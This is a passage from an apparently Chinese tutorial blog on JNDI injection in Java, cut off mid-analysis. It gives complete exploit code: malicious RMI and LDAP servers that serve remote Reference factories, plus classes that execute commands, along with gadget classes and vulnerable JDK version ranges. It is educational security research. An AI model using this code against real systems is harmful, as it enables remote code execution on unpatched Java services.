<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with "</span> + uri);</span><br><span class="line">            ctx.lookup(uri);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">            ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AServer.java，是攻击者搭建的恶意RMI注册表服务而非原本正常的本地RMI注册表服务（做漏洞演示就没必要写正常的服务端那部分了），其将恶意Reference类绑定到RMI注册表中，用于给JNDI客户端加载并执行恶意代码（注意这里的Reference类初始化时其第三个参数即factoryLocation参数随意设置了一个内容，将该恶意类放在与当前RMI注册表服务同一目录中，当然也可以修改该参数为某个URI去加载，但是需要注意的是URL不用指定到特定的class、只需给出该class所在的URL路径即可）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1688</span>);</span><br><span class="line">      <span class="comment">//这里面test的位置是恶意类的位置，比如本地的话就是http://localhost:8080</span></span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, <span class="string">"test"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"exp"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后编写恶意EvilClassFactory类，目标是在客户端执行ifconfig命令，将其编译成class文件后与AServer放置于同一目录下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"ifconfig"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模拟场景，攻击者开启恶意RMI注册表服务AServer，同时恶意类EvilClassFactory放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向AServer的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。效果如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200630135450415.png" alt="image-20200630135450415"></p>
<p>最后小结一下，调用InitialContext.lookup()函数都有哪些类。</p>
<p>在RMI中调用了InitialContext.lookup()的类有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure>

<p>在LDAP中调用了InitialContext.lookup()的类有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring<span class="string">'s LdapTemplate.lookup()</span></span><br><span class="line"><span class="string">LdapTemplate.lookupContext()</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞点2-classFactoryLocation参数注入"><a href="#漏洞点2-classFactoryLocation参数注入" class="headerlink" title="漏洞点2-classFactoryLocation参数注入"></a>漏洞点2-classFactoryLocation参数注入</h3><p>前面lookup()参数注入是基于RMI客户端的（服务端有毒，去污染客户端），也是最常见的。而本小节的classFactoryLocation参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入。</p>
<p>整个利用原理过程如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200703123339015.png" alt="image-20200703123339015"></p>
<p>BClient.java，RMI客户端，通过JNDI来查询RMI注册表上绑定的demo对象，其中lookup()函数参数不可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://127.0.0.1:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        System.out.println(<span class="string">"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo"</span>);</span><br><span class="line">        ctx.lookup(<span class="string">"demo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BServer.java，RMI服务端，创建RMI注册表并将一个远程类的引用绑定在注册表中名为demo，其中该Reference的classFactoryLocation参数外部可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length == <span class="number">1</span>) &#123;</span><br><span class="line">            uri = args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            uri = <span class="string">"http://127.0.0.1/demo.class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]classFactoryLocation: "</span> + uri);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilClass"</span>, <span class="string">"EvilClassFactory"</span>, uri);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"[*]Binding 'demo' to 'rmi://127.0.0.1:1099/demo'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"demo"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EvilClassFactory.java，攻击者编写的远程恶意类，这里是在RMI客户端执行uname -a命令并输出出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilClassFactory</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilClassFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        InputStream inputStream;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inputStream = Runtime.getRuntime().exec(<span class="string">"uname -a"</span>).getInputStream();</span><br><span class="line">            BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(inputStream);</span><br><span class="line">            BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(bufferedInputStream));</span><br><span class="line">            String linestr;</span><br><span class="line">            <span class="keyword">while</span> ((linestr = bufferedReader.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                System.out.println(linestr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200703132943046.png" alt="image-20200703132943046"></p>
<h3 id="漏洞点3-RMI恶意远程对象"><a href="#漏洞点3-RMI恶意远程对象" class="headerlink" title="漏洞点3-RMI恶意远程对象"></a>漏洞点3-RMI恶意远程对象</h3><p>攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：</p>
<ol>
<li>RMI客户端的上下文环境允许访问远程Codebase。</li>
<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false。</li>
</ol>
<p>然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
<p>Changelog:</p>
<ul>
<li>JDK 6u45 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li>
<li>JDK 7u21 <a href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
<h2 id="LDAP攻击向量"><a href="#LDAP攻击向量" class="headerlink" title="LDAP攻击向量"></a>LDAP攻击向量</h2><p>通过LDAP攻击向量来利用JNDI注入的原理和RMI攻击向量是一样的，区别只是换了个媒介而已，下面就只列下LDAP+Reference的利用技巧，至于JNDI注入漏洞点和前面是一样的就不再赘述了。</p>
<h3 id="LDAP-Reference利用技巧"><a href="#LDAP-Reference利用技巧" class="headerlink" title="LDAP+Reference利用技巧"></a>LDAP+Reference利用技巧</h3><p>除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如<code>ldap://xxx/xxx</code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p>
<p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p>
<p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p>
<p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。下面的示例代码中我本地的Jdk版本是1.8.0_73。</p>
<p>LdapServer.java，LDAP服务，需要导入unboundid-ldapsdk.jar包：</p>
<p>maven-pom.xml：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1.1&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8080/#EvilObject2"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>LdapClient.java，LDAP客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"ldap://localhost:1234/EvilObject2"</span>);</span><br><span class="line">            String data = <span class="string">"This is LDAP Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EvilObject.java，恶意类，执行弹出计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject2</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200703190435334.png" alt="image-20200703190435334"></p>
<h1 id="JNDI利用链分析"><a href="#JNDI利用链分析" class="headerlink" title="JNDI利用链分析"></a>JNDI利用链分析</h1><p>这里写一个小PoC，跟进去看看利用链。</p>
<p>客户端，受害者：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端，攻击者部署：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference aa = <span class="keyword">new</span> Reference(<span class="string">"ExecTest"</span>, <span class="string">"ExecTest"</span>, <span class="string">"http://127.0.0.1:8081/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(aa);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"aa"</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>恶意类，干坏事的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">"pwd"</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击截图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200704132057164.png" alt="image-20200704132057164"></p>
<blockquote>
<p>把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。<br>ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。<br>java版本小于1.8u191。之后版本存在trustCodebaseURL的限制，只信任已有的codebase地址，不再能够从指定codebase中下载字节码。</p>
</blockquote>
<h2 id="分析调用流程"><a href="#分析调用流程" class="headerlink" title="分析调用流程"></a>分析调用流程</h2><p>整体调用链如下：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/006iKNp3ly1g8979n598cj30vr08nq3k.jpg" alt="img"></p>
<p>第一个函数，InitialContext.lookup函数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="comment">//getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象</span></span><br><span class="line">        <span class="comment">//然后在对应协议中去lookup搜索，我们进入lookup函数</span></span><br><span class="line">        <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>第二个，GenericURLContext.lookup函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//var1="rmi://127.0.0.1:1099/aa"</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span></span><br><span class="line">    